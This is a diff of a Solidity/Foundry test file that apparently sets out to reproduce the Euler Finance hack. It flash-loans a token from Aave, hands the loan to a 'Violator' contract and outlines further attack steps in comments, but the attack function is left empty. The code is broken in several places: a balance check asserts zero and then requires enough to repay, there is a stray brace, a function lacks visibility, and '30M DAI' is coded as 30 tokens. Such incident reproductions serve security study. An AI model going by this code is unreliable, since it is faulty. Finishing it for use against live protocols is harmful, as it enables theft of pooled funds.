@@ -2,25 +2,27 @@
 // TODO update sol version
 pragma solidity ^0.8.0;
 
+import {Test, console2} from "forge-std/Test.sol";
 import {IPool} from "@aave/v3/interfaces/IPool.sol";
-import {IPoolAddressesProvider} from "@aave/v3/interfaces/IPoolAddressesProvider.sol";
 import {FlashLoanSimpleReceiverBase} from "@aave/v3/flashloan/base/FlashLoanSimpleReceiverBase.sol";
 import {IERC20} from "@aave/v3/dependencies/openzeppelin/contracts/IERC20.sol";
+import {IPoolAddressesProvider} from "@aave/v3/interfaces/IPoolAddressesProvider.sol";
 
-contract EulerHackPoC is FlashLoanSimpleReceiverBase{
-    address constant aDAI = 0x018008bfb33d285247A21d44E50697654f754e63;
-
-    //address constant aDAI = 0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c;
-
+contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test{
+    Violator private violator;
      constructor(
-        address _addressProvider
-    ) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider)) {}
+        IPoolAddressesProvider _addressProvider,
+        address _collateral
+    ) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider)) {
+         violator = new Violator();
+     }
 
     // 1. Flahsloan 30M DAI from AaveV2
-    function callFashLoan() external {
-       POOL.flashLoanSimple(address(this), aDAI, 30 * 10**18, "0x", 0);
+    function callFashLoan(address _tokenAddress, uint256 _amount) external {
+       POOL.flashLoanSimple(address(this), _tokenAddress, _amount, "0x", 0);
     }
 
+    // flashLoanSimple callback
     function executeOperation(
         address asset,
         uint256 amount,
@@ -32,10 +34,13 @@ contract EulerHackPoC is FlashLoanSimpleReceiverBase{
         returns (bool)
     {
 
-        // At the end of your logic above, this contract owes
-        // the flashloaned amounts + premiums.
-        // Therefore ensure your contract has enough to repay
-        // these amounts.
+        // 2. Transfer the full 30m DAI loan balance to the violator
+        IERC20(asset).transfer(address(violator), amount);
+
+        // check balance
+        uint256 balance = IERC20(asset).balanceOf(address(this));
+        assertEq(balance, 0);
+        require(balance >= amount + premium, "Not enough funds to repay loan!");
 
         // Approve the LendingPool contract allowance to *pull* the owed amount
         uint amountOwing = amount + premium;
@@ -59,6 +64,11 @@ contract EulerHackPoC is FlashLoanSimpleReceiverBase{
 }
 
 contract Violator {
+    function executeAttack() {
+        // 3. Deposit 20m DAI to the DAI EToken of Euler Finance, receiving ~19,56m eDAI tokens
+
+    }
+}
 }
 
 contract Liquidator {}
